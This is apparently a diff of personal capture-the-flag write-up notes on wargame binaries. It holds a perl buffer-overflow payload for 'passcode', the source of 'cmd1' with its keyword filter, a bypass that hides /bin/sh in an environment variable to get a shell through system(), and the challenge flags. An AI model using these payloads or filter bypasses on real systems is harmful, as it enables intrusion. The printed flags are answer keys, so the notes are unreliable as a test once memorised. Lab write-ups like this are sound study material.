@@ -112,7 +112,6 @@ OFFSET   TYPE              VALUE
 (perl -e 'print "\x41"x96 . "\x14\xc0\x04\x08"'; perl -e 'print "134517443"') | ./passcode
 
 ---------------------------------------------[random]----------------------------------------------
-#include <stdio.h>
 
 int main(){
 	unsigned int random;
@@ -143,3 +142,36 @@ Because the program expects input in decimal (base 10), x must be converted back
 otherwise the scanf will not work.
 
 flag: m0mmy_I_can_predict_rand0m_v4lue!
+
+----------------------------------------------[cmd1]-----------------------------------------------
+Program sets PATH environment variable to /thankyouverymuch. Then filters arg1 to ensure that it
+does not contain the words: "flag", "sh", "tmp". Then executes system(arg1)
+
+int filter(char* cmd){
+	int r=0;
+	r += strstr(cmd, "flag")!=0;
+	r += strstr(cmd, "sh")!=0;
+	r += strstr(cmd, "tmp")!=0;
+	return r;
+}
+int main(int argc, char* argv[], char** envp){
+	putenv("PATH=/thankyouverymuch");
+	if(filter(argv[1])) return 0;
+	setregid(getegid(), getegid());
+	system( argv[1] );
+	return 0;
+}
+
+filter prevents reading the flag directly, or by symbolic link, and launching root shell. 
+PATH manipulation means that standard commands such as (cat, ls, rm, etc) do not work.
+
+Because system executes cmd line arg, passing environment var such as $EXPLOIT="/bin/sh" means that
+it will open a shell.
+$ ./cmd1 '$EXPLOIT'
+However a limitation is that because the PATH is set to some random directory, there is no access 
+to standard commands. We can reset the PATH, and this will give commands back. From there read flag
+$ export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
+$ cat flag
+
+flag: PATH_environment?_Now_I_really_g3t_it,_mommy!
+
